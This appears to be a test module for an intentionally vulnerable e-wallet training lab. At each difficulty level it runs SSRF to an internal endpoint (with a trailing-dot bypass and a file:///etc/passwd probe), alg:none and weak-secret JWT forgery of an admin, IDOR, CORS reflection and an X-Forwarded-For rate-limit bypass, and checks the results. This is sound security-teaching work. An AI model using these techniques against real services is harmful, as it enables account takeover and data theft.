"""E-wallet webhook (SSRF) and the REST API.

Runs a live loopback server so the server-side webhook fetch really leaves the
process, then exercises the ``/api/v1`` surface: token issuance, JWT handling,
CORS reflection and rate limiting.
"""

import sys
import threading

import jwt
import werkzeug.serving

from harness import CUSTOMER, csrf, lab, login, parse_levels, rows, run_module, text

TITLE = "SSRF + REST API - webhook, JWT, CORS, rate limit"

EXPECT = {
    "login":                  (302, 302, 302, 302),
    # SSRF: reach the internal metadata endpoint until `hard`
    "ssrf_internal_flag":     (True, True, False, False),
    "ssrf_internal_status":   (200, 200, 400, 400),
    # a trailing dot bypasses the medium blacklist, fixed on `patched`
    "ssrf_trailing_dot":      (True, True, True, False),
    # file:// never fetches; only easy leaks the exception class
    "scheme_error_leak":      (True, False, False, False),
    # a legitimate loopback partner is refused once the allowlist appears
    "partner_reachable":      (True, True, False, False),
    "partner_after_allowlist": (None, None, True, True),
    "webhook_signature_valid": (False, False, True, True),
    # API: JWT handling
    "token_status":           (200, 200, 200, 200),
    "profile_ok":             (True, True, True, True),
    "alg_none_status":        (200, 200, 401, 401),
    "alg_none_admin":         (True, True, False, False),
    "weak_secret_status":     (200, 200, 401, 401),
    # API: object ownership
    "balance_foreign_status": (200, 200, 200, 403),
    "balance_own_status":     (200, 200, 200, 200),
    "dashboard_foreign_status": (200, 200, 200, 403),
    # API: CORS reflection
    "cors_reflected":         (True, True, False, False),
    # API: rate limiting and its X-Forwarded-For bypass
    "rate_limited":           (False, False, True, True),
    "rate_bypass_via_xff":    (True, True, True, False),
    # error detail: unknown vs wrong-password are distinguishable until `hard`
    "enumeration_signal":     (True, True, False, False),
}


def _free_port():
    import socket
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def run(level):
    out = {}
    with lab(level) as (app, db_path, _uploads, _tmp):
        client = app.test_client()
        out["login"] = login(client).status_code

        # --- live loopback server, the SSRF target -------------------------
        port = _free_port()
        server = werkzeug.serving.make_server("127.0.0.1", port, app, threaded=True)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        base = f"http://127.0.0.1:{port}"

        def connect(url):
            return client.post("/wallet", data={
                "label": "DompetKu", "url": url, "csrf_token": csrf(client, "/wallet")})

        try:
            resp = connect(f"{base}/internal/metadata")
            out["ssrf_internal_status"] = resp.status_code
            out["ssrf_internal_flag"] = \
                "FLAG{ssrf_internal_metadata_reached}" in text(resp)

            out["ssrf_trailing_dot"] = "FLAG{ssrf_internal_metadata_reached}" in text(
                connect(f"http://localhost.:{port}/internal/metadata"))

            out["scheme_error_leak"] = "InvalidSchema" in text(connect("file:///etc/passwd"))

            partner = f"{base}/wallet/partner"
            resp = connect(partner)
            body = text(resp)
            out["partner_reachable"] = "Permintaan diterima" in body

            if not out["partner_reachable"]:
                # Operators trust partner hosts through settings.webhook_allowlist.
                from harness import execute
                execute(db_path,
                        "INSERT INTO settings(key, value) VALUES('webhook_allowlist', ?) "
                        "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
                        ("partner.nusabank.example.com,127.0.0.1",))
                body = text(connect(partner))
                out["partner_after_allowlist"] = "Permintaan diterima" in body
            else:
                out["partner_after_allowlist"] = None

            # The fetched page is embedded in <pre>, so Jinja escapes its quotes.
            out["webhook_signature_valid"] = (
                'data-signature="valid"' in body
                or 'data-signature=&#34;valid&#34;' in body)
        finally:
            server.shutdown()
            thread.join(timeout=5)

        # --- REST API: token + profile --------------------------------------
        resp = client.post("/api/v1/auth/token",
                           json={"username": CUSTOMER[0], "password": CUSTOMER[1]})
        out["token_status"] = resp.status_code
        token = (resp.get_json() or {}).get("access_token")

        profile = client.open("/api/v1/profile",
                              headers={"Authorization": f"Bearer {token}"})
        out["profile_ok"] = profile.status_code == 200 and b"budi01@example.com" in profile.data

        # alg:none impersonation of the admin account
        none_token = jwt.encode({"sub": "1", "role": "admin", "username": "admin"},
                                None, algorithm="none")
        if isinstance(none_token, bytes):
            none_token = none_token.decode()
        resp = client.open("/api/v1/profile?user_id=1",
                           headers={"Authorization": f"Bearer {none_token}"})
        out["alg_none_status"] = resp.status_code
        out["alg_none_admin"] = (resp.get_json() or {}).get("profile", {}) \
            .get("username") == "admin"

        forged = jwt.encode({"sub": "1", "role": "admin"}, "nusabank123",
                            algorithm="HS256")
        out["weak_secret_status"] = client.open(
            "/api/v1/profile", headers={"Authorization": f"Bearer {forged}"}).status_code

        # --- REST API: object ownership --------------------------------------
        accounts = rows(db_path, "SELECT id, user_id FROM accounts ORDER BY id")
        me = rows(db_path, "SELECT id FROM users WHERE username=?", (CUSTOMER[0],))[0]["id"]
        mine = next(a["id"] for a in accounts if a["user_id"] == me)
        foreign = next(a["id"] for a in accounts if a["user_id"] != me)

        out["balance_foreign_status"] = client.open(
            f"/api/v1/balance?account_id={foreign}",
            headers={"Authorization": f"Bearer {token}"}).status_code
        out["balance_own_status"] = client.open(
            f"/api/v1/balance?account_id={mine}",
            headers={"Authorization": f"Bearer {token}"}).status_code

        # --- REST API: CORS ---------------------------------------------------
        resp = client.get("/api/v1/ping", headers={"Origin": "https://evil.example"})
        out["cors_reflected"] = resp.headers.get("Access-Control-Allow-Origin") \
            == "https://evil.example"

        # --- REST API: rate limiting ------------------------------------------
        statuses = [client.post("/api/v1/auth/token",
                                json={"username": CUSTOMER[0], "password": "salah"}
                                ).status_code for _ in range(12)]
        out["rate_limited"] = 429 in statuses

        from app.security import _RATE
        _RATE.clear()
        statuses = [client.post("/api/v1/auth/token",
                                json={"username": CUSTOMER[0], "password": "salah"},
                                headers={"X-Forwarded-For": f"10.9.9.{i}"}
                                ).status_code for i in range(12)]
        out["rate_bypass_via_xff"] = 429 not in statuses

        _RATE.clear()
        resp = client.post("/api/v1/auth/token",
                           json={"username": "tidak_ada_user", "password": "x"})
        out["enumeration_signal"] = (resp.get_json() or {}).get("code") == "unknown_user"

        # --- dashboard IDOR seen through the API session ----------------------
        out["dashboard_foreign_status"] = client.get(
            f"/dashboard?account_id={foreign}").status_code
    return out


if __name__ == "__main__":
    sys.exit(run_module(TITLE, run, EXPECT, parse_levels()))
